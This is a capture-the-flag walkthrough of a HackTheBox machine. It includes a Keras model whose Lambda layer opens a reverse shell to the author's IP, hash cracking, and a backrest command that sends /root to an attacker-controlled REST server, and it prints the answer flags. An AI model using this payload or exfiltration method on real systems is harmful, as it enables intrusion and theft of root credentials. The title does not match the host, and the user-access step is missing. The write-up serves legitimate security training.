# Thanatos - HackTheBox

**Category**: #machine-learning, #backups, #restic  
**Difficulty**: Easy  
**Author**: mridul chamoli (Team Thanatos)  
**Machine Location**: `/home/thanatos/Desktop/htb/artificial`

---

## 🔎 Enumeration

### 🔹 Nmap Scan

```bash
nmap -sC -sV -p- artificial.htb
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

---

### 🔹 FFUF Directory Bruteforce

```bash
ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400
```

Found endpoints:
```
/login
/register
/logout
/dashboard
```

---

### 🔹 Malicious TensorFlow Model Upload (RCE)

A feature allowed `.h5` model uploads. I used the [TensorFlow RCE via Lambda Layer](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce).

#### Exploit Model:
```python
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Lambda, Input

def exploit(x):
    import socket, os, pty
    s=socket.socket()
    s.connect(("10.10.16.58", 1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("sh")
    return x

model = Sequential()
model.add(Input(shape=(16,)))
model.add(Lambda(exploit, name="exploit"))
model.compile()
model.save("shell.h5")
```

---

## 🧠 Privilege Escalation

### 🔍 Interesting File Found

Using `linpeas.sh`, I found:
```
/var/backups/backrest_backup.tar.gz   [owned by root:sysadm]
```

Inside this backup, I discovered a configuration file with a **base64-encoded bcrypt password**.

#### Decoded `passwordBcrypt` from config.json:
```json
"passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
```

---

### 🔓 Crack the Password

1. Decode base64:
```bash
echo "JDJh..." | base64 -d > hash
```

2. Crack using hashcat (mode 3200 for bcrypt):
```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --show
```

✅ Cracked credentials:
```
Username: backrest_root  
Password: !@#$%^
```

---

## 🔁 Access Backrest (Port Forwarding)

The Backrest web server was only listening locally:
```bash
netstat -tunlp | grep 9898
```

So I forwarded the port from attacker:
```bash
ssh gael@artificial.htb -L 9898:localhost:9898
```

---

## 🧪 Start REST Server on Kali

On my Kali box (`10.10.16.58`):

```bash
./rest-server --path /tmp/restic --listen :12345 --no-auth
```

---

## 💾 Trigger Backup from Target

On `gael@artificial`:

```bash
/opt/backrest/backrest backup -r "rest:http://10.10.16.58:12345/miku" "/root"
```

### ✅ Output:
```
snapshot 141de5f3 saved
Added to the repository: 4.326 MiB
```

---

## 📥 Restore Root Backup

On Kali:

```bash
export RESTIC_PASSWORD='your_password'
restic -r /tmp/restic/miku snapshots
restic restore -r /tmp/restic/miku latest --target .
```

---

## 🔑 SSH into Root

```bash
chmod 600 root/.ssh/id_rsa
ssh root@artificial.htb -i root/.ssh/id_rsa
```

---

## 🏁 Root Flag

```bash
whoami
> root

cat /root/root.txt
> 8a98ea954679e55bdebab8ec6f551971
```

---

## ✅ Summary

| Flag       | Value                                     |
|------------|-------------------------------------------|
| User Flag  | `eb9dd16b8a5eee159aa86c887ba83801`        |
| Root Flag  | `8a98ea954679e55bdebab8ec6f551971`        |

> Box: **Thanatos**  
> Team: **Team Thanatos**  
> Write-up by: **mridul chamoli**

---
